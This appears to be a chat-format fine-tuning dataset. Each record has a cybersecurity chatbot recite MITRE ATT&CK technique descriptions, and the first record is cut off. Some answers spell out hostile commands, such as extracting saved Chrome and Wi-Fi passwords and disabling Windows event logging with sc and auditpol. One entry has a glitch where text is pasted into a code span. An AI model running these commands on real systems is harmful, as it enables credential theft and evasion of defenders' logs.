passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Direct Cloud VM Connections' and with the Id: T1021.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Direct Cloud VM Connections' and with the Id: T1021.008 is described as follows: Adversaries may leverage [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the [Cloud API](https://attack.mitre.org/techniques/T1059/009), such as Azure Serial Console(Citation: Azure Serial Console), AWS EC2 Instance Connect(Citation: EC2 Instance Connect)(Citation: lucr-3: Getting SaaS-y in the cloud), and AWS System Manager.(Citation: AWS System Manager).Methods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. Adversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console) These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)).. The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Credentials from Web Browsers' and with the Id: T1503 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Credentials from Web Browsers' and with the Id: T1503 is described as follows: Adversaries may acquire credentials from web browsers by reading files specific to the target browser.  (Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData April 2018) Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Binary Proxy Execution' and with the Id: T1218 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Binary Proxy Execution' and with the Id: T1218 is described as follows: Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split). The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Source' and with the Id: T1153 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Source' and with the Id: T1153 is described as follows: **This technique has been deprecated and should no longer be used.**The <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>.**This technique has been deprecated and should no longer be used.** /path/to/filename [arguments]</code>. Take note of the space after the \".\". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.(Citation: Source Manual)Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DLL Search Order Hijacking' and with the Id: T1038 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DLL Search Order Hijacking' and with the Id: T1038 is described as follows: Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. Adversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'New Service' and with the Id: T1050 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'New Service' and with the Id: T1050 is described as follows: When operating systems boot up, they can start programs or applications called services that perform background system functions. (Citation: TechNet Services) A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry. Adversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with [Masquerading](https://attack.mitre.org/techniques/T1036). Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1035).. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Timestomp' and with the Id: T1070.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Timestomp' and with the Id: T1070.006 is described as follows: Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Reflective Code Loading' and with the Id: T1620 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Reflective Code Loading' and with the Id: T1620 is described as follows: Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)Reflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks). The systems targeted by this attack pattern are: macOS, Linux, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Wi-Fi Discovery' and with the Id: T1016.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Wi-Fi Discovery' and with the Id: T1016.002 is described as follows: Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087), [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006) activity to support both ongoing and future campaigns.Adversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile \u201cWi-Fi name\u201d key=clear` to show a Wi-Fi network\u2019s corresponding password.(Citation: BleepingComputer Agent Tesla steal wifi passwords)(Citation: Malware Bytes New AgentTesla variant steals WiFi credentials)(Citation: Check Point APT35 CharmPower January 2022) Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: Binary Defense Emotes Wi-Fi Spreader)On Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.(Citation: Wi-Fi Password of All Connected Networks in Windows/Linux) On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).(Citation: Find Wi-Fi Password on Mac). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Ignore Process Interrupts' and with the Id: T1564.011 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Ignore Process Interrupts' and with the Id: T1564.011 is described as follows: Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.(Citation: Linux Signal Man)  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. Adversaries may invoke processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue) This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.Hiding from process interrupt signals may allow malware to continue execution, but unlike [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will not be re-invoked once actually terminated.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Escape to Host' and with the Id: T1611 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Escape to Host' and with the Id: T1611 is described as follows: Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)There are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.. The systems targeted by this attack pattern are: Windows, Linux, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Shortcut Modification' and with the Id: T1547.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Shortcut Modification' and with the Id: T1547.009 is described as follows: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176)) to persistently launch malware.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Application Window Discovery' and with the Id: T1010 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Application Window Discovery' and with the Id: T1010 is described as follows: Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.. The systems targeted by this attack pattern are: macOS, Windows, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Standard Cryptographic Protocol' and with the Id: T1032 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Standard Cryptographic Protocol' and with the Id: T1032 is described as follows: Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Email Account' and with the Id: T1087.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Email Account' and with the Id: T1087.003 is described as follows: Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)In on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List). The systems targeted by this attack pattern are: Windows, Office 365, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hypervisor' and with the Id: T1062 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hypervisor' and with the Id: T1062 is described as follows: **This technique has been deprecated and should no longer be used.**A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with [Rootkit](https://attack.mitre.org/techniques/T1014) functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Time Based Evasion' and with the Id: T1497.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Time Based Evasion' and with the Id: T1497.003 is described as follows: Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'AppCert DLLs' and with the Id: T1182 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'AppCert DLLs' and with the Id: T1182 is described as follows: Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. (Citation: Elastic Process Injection July 2017)Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'CMSTP' and with the Id: T1218.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'CMSTP' and with the Id: T1218.003 is described as follows: Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SSH Hijacking' and with the Id: T1563.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SSH Hijacking' and with the Id: T1563.001 is described as follows: Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disable Windows Event Logging' and with the Id: T1562.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disable Windows Event Logging' and with the Id: T1562.002 is described as follows: Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.The EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Scheduled Transfer' and with the Id: T1029 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Scheduled Transfer' and with the Id: T1029 is described as follows: Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SMB/Windows Admin Shares' and with the Id: T1021.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SMB/Windows Admin Shares' and with the Id: T1021.002 is described as follows: Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares). The systems targeted by this attack pattern are: Windows ."}]}
